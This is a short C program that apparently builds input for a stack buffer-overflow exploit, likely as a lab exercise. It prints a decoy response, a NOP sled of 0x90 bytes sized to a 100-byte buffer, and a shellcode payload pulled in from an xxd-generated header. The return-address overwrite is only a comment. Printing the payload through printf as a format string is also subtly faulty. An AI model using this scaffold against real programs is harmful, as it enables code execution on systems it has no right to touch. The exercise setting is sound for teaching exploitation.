#include <stdio.h>
#include <stdlib.h>

/* xxd --include 1_bufferOverflowConsole_payload > 1_bufferOverflowConsole_payload.h
 * unsigned char __1_bufferOverflowConsole_payload[] = {
 * ...
 * };
 * unsigned int __1_bufferOverflowConsole_payload_len = ..;
 */
#include "1_bufferOverflowConsole_payload.h"

#define BUFFER_SIZE 100
#define RESPONSE "test"

int main(int argc, char **argv) {
	/* "Valid" response */
	printf(RESPONSE);

	/* NOP sled */
	for(int i = 0; i < (BUFFER_SIZE - sizeof(RESPONSE) - __1_bufferOverflowConsole_payload_len); i++, putchar(0x90));

	/* payload */
	printf(__1_bufferOverflowConsole_payload);

	/* return instruction pointer */
}

